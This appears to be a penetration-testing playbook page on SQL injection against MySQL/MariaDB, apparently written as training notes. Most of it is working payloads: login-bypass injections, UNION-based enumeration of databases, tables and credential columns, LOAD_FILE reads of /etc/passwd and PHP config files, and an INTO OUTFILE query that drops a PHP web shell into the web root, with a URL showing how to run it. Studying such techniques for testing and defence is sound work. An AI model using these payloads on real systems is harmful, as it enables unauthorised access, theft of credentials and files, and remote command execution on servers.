---
slug: /playbooks/sqli
pagination_next: null
pagination_prev: null
---
# SQL Injections

This article describes some tricks for successful SQL injection. The commands describe here apply only for MySQL/MariaDB, but similar approach can be taken for any other relational databases.

## Comments

When trying to make the SQL injection, remember that SQL has different comment characters: `#`  and `--`. Mind the space in the last one, it's better to use `-- -` char for this kind of escape.

## URL encode

If you are trying to discover a SQL injection and you fail, remember that you might need to use the URL-encoded characters:

| Character | URL Encoded Character |
| --------- | --------------------- |
|'          | %27                   |
|"          | %22                   |
|#          | %23                   |
|;          | %3B                   |
|)          | %29                   |

## Query logic

Remember you can subvert any query logic by using the `AND` and `OR` operators, e.g:

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```

If you are free to input any value in admin you can ignore the AND:

```sql
SELECT * FROM logins WHERE username='admin'--' AND password = 'p@ssw0rd';
```

Another example, you can just not only ignore the conditions but change them:

```sql
SELECT * FROM logins WHERE ((username='admin') AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e'
```

username = other')) OR id=5'--

```sql
SELECT * FROM logins WHERE ((username='username = other')) OR id=5'--) AND id > 1) AND password = 'd41d8cd98f00b204e9800998ecf8427e'
```
And you will log-in as user with ID 5

## Union

You can abuse the SQL injection to extract info from any table using the `UNION` clause. You just need to know the number of columns.

You can combine the outputs of two tables provided they have the same number of columns.

In order to know the number of columns, you can use the following methods:

- Order by: you can pass the number of column to sort by: 1,2,3, keep trying until you got an error. That's the number of columns.

- Union: similar to the last one but provide the colums to a union query: `UNION select 1,2,3`. When it fails, you'll know the max number of columns.

This last method provides the benefit that you see in the UI if there are some hidden column.

## Enumerating through SQL injection

You can extract the information in the database via SQL injection. However, first you must know the databases inside, the tables and the structure of them.

No worries, you can make use of the table metadata to obtain this information:

### Databases

All available databases

```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

Current database

```sql
select 1,database(),2,3-- -
```

### Tables

All available tables in database `dev`

```sql
select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'
```

### Table columns

All available columns in table 'credentials'

```sql
select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'
```

## User privileges

In certain conditions the user might be authorized to read/write files from the database. First of all you need to know the privileges of the current user:

To know the user running the database:

```sql
SELECT 1, user(), 3, 4
```

Check if the user is a super-user:

```sql
SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"
```

List all privileges of user:

```sql
SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"
```

### Reading

If `FILE` privilege is granted for the user, you might be able to read any system file from the database engine:

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4
```

This will work provided the user running the database has read access in the OS.

You can use `TO_BASE64` function for convinience:

```sql
SELECT 1, TO_BASE64(LOAD_FILE("/var/www/html/config.php")), 3, 4
```

And later decode it:
```shell
cat /tmp/b.txt | tr -d ' ' | base64 -d  > /tmp/b.php
```

Note that displaying the base64 added some whitespaces which `base64` command dislikes. You can use `tr` to remove those chars.

### Writing

There are some requirements to be able to write a file from the database:

- `FILE` privilege
- Global `secure_file_priv` variable not enabled
- The user running the database must have write access to the destination

You can check the global variable with a query like:

```sql
SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"
```

If the conditions are met, writing to a file is simple:

```sql
select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'
```

Then, you can try more advanced stuff, like writing a web shell:

```sql
select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'
```

The attacker might run this web-shell from http://SERVER_IP:PORT/shell.php?0=id